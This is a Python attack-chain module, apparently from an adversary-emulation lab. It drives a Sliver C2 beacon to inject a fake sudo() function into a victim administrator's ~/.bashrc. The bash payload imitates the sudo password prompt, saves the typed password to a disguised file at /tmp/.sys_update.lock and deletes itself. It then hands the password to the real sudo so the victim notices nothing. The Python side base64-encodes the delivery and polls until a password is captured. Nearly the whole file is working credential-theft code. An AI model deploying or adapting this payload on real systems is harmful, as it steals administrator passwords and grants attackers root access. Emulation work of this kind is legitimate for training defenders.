import base64
import time

from chainlog import log
from advanced_initial_access import sliver_exec

# =============================================================================
# advanced_vinzenzws_privesc.py — Sudo Phishing via Sliver C2
# MITRE ATT&CK:
#   T1546.004 - Event Triggered Execution: Unix Shell Configuration Modification
#   T1140     - Deobfuscate/Decode Files or Information (base64)
#   T1078.003 - Valid Accounts: Local Accounts (Root access, downstream)
# -----------------------------------------------------------------------------
# Executes FROM kali, driving the sliver beacon running on vinzenz's
# workstation. It appends a malicious ``sudo()`` shell function to
# ~/.bashrc; the function captures the password the next time the admin
# runs sudo in an interactive shell, writes it to /tmp/.sys_update.lock on
# the target for later retrieval, then transparently invokes the real
# /usr/bin/sudo so the admin's command succeeds and they notice nothing.
# =============================================================================

# Sentinels delimit the injected block so the self-unhook sed (and any future
# external cleanup) deletes only our function -- never neighbouring user
# content in ~/.bashrc. The previous range pattern ``/sudo() {/,/}/`` matched
# the next ``}`` anywhere in the file, which would have clobbered unrelated
# function bodies.
SENTINEL_BEGIN = "# __SUDO_PHISH_BEGIN__"
SENTINEL_END   = "# __SUDO_PHISH_END__"

# On-target path where the captured admin password is dropped. Returned to
# the chain via state key ``vinzenz_password_file`` for downstream steps.
PASSWORD_DROP_PATH = "/tmp/.sys_update.lock"

# Phish payload, kept as plain bash (no Python f-string brace-escapes) so
# readers see real shell. ``%BEGIN%`` / ``%END%`` / ``%DROP%`` are
# substituted at run() time via .replace(); shell parameters like ``$USER``,
# ``$@``, ``$pass``, ``$firstchar`` stay literal.
_PAYLOAD_TEMPLATE = """%BEGIN%
sudo() {
    read -rsn1 -p "[sudo] password for $USER: " firstchar
    if [ -z "$firstchar" ]; then echo; /usr/bin/sudo "$@"; return; fi
    read -rs pass
    pass="$firstchar$pass"
    echo
    echo "$pass" > %DROP%
    # Self-unhook: delete only the sentinel-bounded block we injected.
    sed -i '/^%BEGIN%$/,/^%END%$/d' ~/.bashrc 2>/dev/null
    unset -f sudo
    # Pass control to the real sudo so the admin's command runs normally.
    echo "$pass" | /usr/bin/sudo -S "$@"
}
%END%
"""

# Capture window. simulate_admin.sh fires an interactive ``bash -ic`` with
# sudo about every ~30s on average (15s polling × 50% maintenance gate), so
# 120s wall-clock gives ~4 expected triggers and a ~1.6% miss rate. Failing
# loudly on timeout is intentional: downstream steps key off the drop file
# actually existing.
_PHISH_TIMEOUT_S       = 120
_PHISH_POLL_INTERVAL_S = 5


def run(vinzenz_beacon, kali_host):
    """
    Inject a Sudo Phish function into vinzenz's ~/.bashrc, then poll the
    target until the admin triggers it (or the deadline expires).

    Args:
        vinzenz_beacon (str): Sliver beacon ID running on vinzenz's workstation.
        kali_host (str):      Kali IP (reserved for future curl-based exfil --
                              the current implementation only writes the
                              captured password to a file on the target).

    Returns:
        dict: ``{"vinzenz_password_file": "/tmp/.sys_update.lock"}`` on
              successful capture, ``{"vinzenz_password_file": None}`` if the
              injection itself failed.

    Raises:
        RuntimeError: if the injection succeeded but the admin never
                      triggered the function within ``_PHISH_TIMEOUT_S``.
    """
    log("\n[*] Starting Sudo Phishing on Vinzenz Workstation (T1546.004)...")

    payload = (
        _PAYLOAD_TEMPLATE
        .replace("%BEGIN%", SENTINEL_BEGIN)
        .replace("%END%",   SENTINEL_END)
        .replace("%DROP%",  PASSWORD_DROP_PATH)
    )

    log("[*] Injecting malicious sudo function into ~/.bashrc...")

    # Base64 dodge sliver ``execute``'s shell-quoting quirks (T1140 on the
    # defender's side: they'll need to ``base64 -d`` to read the dropped
    # block, since it lands in ~/.bashrc already decoded but the transport
    # was opaque).
    b64_payload = base64.b64encode(payload.encode()).decode()
    cmd = f"execute -o -- sh -c 'echo \"{b64_payload}\" | base64 -d >> ~/.bashrc'"

    out = sliver_exec(vinzenz_beacon, cmd)
    if out and "error" in out.lower():
        log(f"[-] Failed to inject sudo function: {out.strip()}")
        return {"vinzenz_password_file": None}

    log(f"[*] Sudo function injected. Polling {PASSWORD_DROP_PATH} for up to "
        f"{_PHISH_TIMEOUT_S}s for the admin to trigger it...")

    # Poll the drop file rather than sleeping a fixed 45s. Success path
    # returns the moment the admin actually fires sudo (often within ~30s
    # of injection); failure path raises so a downstream step can never
    # mistake a missing capture for a successful one. ``[ -s ]`` checks
    # the file exists AND has content -- guards against the harmless case
    # where the sudo() early-return path touched the file with no password.
    deadline = time.time() + _PHISH_TIMEOUT_S
    probe_cmd = (
        f"execute -o -- sh -c '[ -s {PASSWORD_DROP_PATH} ] "
        f"&& echo PHISH_CAPTURED'"
    )
    while time.time() < deadline:
        probe = sliver_exec(vinzenz_beacon, probe_cmd)
        if probe and "PHISH_CAPTURED" in probe:
            log(f"[+] Password captured! Stored on target at "
                f"{PASSWORD_DROP_PATH} for downstream retrieval.")
            return {"vinzenz_password_file": PASSWORD_DROP_PATH}
        time.sleep(_PHISH_POLL_INTERVAL_S)

    raise RuntimeError(
        f"sudo phishing on vinzenz's workstation timed out after "
        f"{_PHISH_TIMEOUT_S}s -- no password file appeared at "
        f"{PASSWORD_DROP_PATH}. Admin may not have invoked sudo in an "
        f"interactive shell during the window."
    )
